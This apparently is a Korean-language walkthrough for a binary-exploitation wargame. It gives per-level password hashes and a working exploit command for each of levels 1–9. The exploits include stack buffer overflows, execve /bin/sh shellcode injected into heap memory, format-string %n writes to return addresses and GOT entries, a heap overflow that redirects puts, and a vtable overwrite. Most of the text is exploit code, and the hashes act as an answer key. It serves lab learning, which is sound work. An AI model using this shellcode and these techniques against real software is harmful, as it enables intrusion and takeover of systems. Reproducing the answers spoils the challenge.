> level0 - level0

> level1 - 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

```shell
(gdb) print ($ebp + 4) - ($esp + 0x10)
result: 76

$ cat <(python -c 'print "A" * 76 + "\x44\x84\x04\x08",') - | ./level1
cat /home/user/level2/.pass
```


> level2 - 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```bash
cat <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A" * 52)  + "\x08\xa0\x04\x08"') - | ./level2
```

대부분의 메모리 영역(스택, 동적 라이브러리)이 0xb???????위치에 존재하는데, 이 위치에서의 실행을 막는 코드가 내장되어있다. 따라서 malloc의 매핑 주소(코드 상의 \x08\xa0\x04\x08 부분)에 shellcode를 주입하는 방식으로 해결

> level3 - 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

printf의 첫 번째 인자가 우리가 직접 넣어줄 수 있는 문자열이다.
따라서 printf의 %n 모디파이어를 이용해서 특정 주소의 쓰기 작업이 가능하다

```bash
cat <(python -c 'print "\x8c\x98\x04\x08%020p%020p%020p%n",') - | ./level3
```

> level4 - b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

이전 레벨과 비슷하지만 nasted 함수 호출이 있어서 그걸 이용하여 안쪽 함수에서 ret 위치를 cmp부분을 건너 띈 위치로 조작하였다. 이때 매모리 주소가 매우 높아서 %n으로 전체 4바이트 값을 넣기 힘드므로 length modifier hh(%hhn)를 사용해서 맨 끝 1바이트만 조작했다.

```bash
python -c 'print "\xdc\xf4\xff\xbf%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%0149u%hhn",' | ./level4
```

> level5 - 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

이전 레벨과 비슷하게 printf를 이용하는 문제이다. 다만 모든 함수 호출에서 return 대신 exit을 하는 것을 볼 수 있는데.
exit의 got를 o라는 쉘을 호출해주는 함수의 주소로 조작하면 된다.

```bash
cat <(python -c 'print "\x38\x98\x04\x08%.0s%.0s%033952x%hn",') - | ./level5
```

> level6 - d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

strcpy의 buffer overflow를 이용해서 잘못된 함수 포인터를 넣을 수 있다.

```bash
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08",')
```

> level7 - f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

malloc을 총 4번 실행하는데, 대충

```c
struct test {
    int dummy;
    char *p;
}

a = malloc(sizeof(struct test));
b = malloc(STRING_SIZE);
a->p = b;

c = malloc(sizeof(struct test));
d = malloc(STRING_SIZE);
c->p = d;
```
과 같은 순서로 할당한다.
이때 매모리 상에서의 순서가 a -> b -> c -> d가 되므로,

첫번째 strcpy(dst는 b위치에 있음)에서 c->p위치를 덮어쓸 수 있다.

이 위치를 puts의 GOT로 덮어 쓴 다음에

두 번째 strcpy에서 함수 m의 위치를 복사하면 된다.

```bash
/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08",') $(python -c 'print "\xf4\x84\x04\x08",')
```

> level8 - 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

배열크기를 초과한 위치를 참조하는 것을 이용했다.

```bash
cat <(printf "auth .\nservice0123456789012345\nlogin\n") - | ./level8
```

> level9 - c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

memcopy를 인자에서 받아서 실행하는데, vtable을 덮어써서 쉘코드를 실행시킬 수 있다.

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A" * 76) + "\x0c\xa0\x04\x08",')
```

> bonus0 - f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

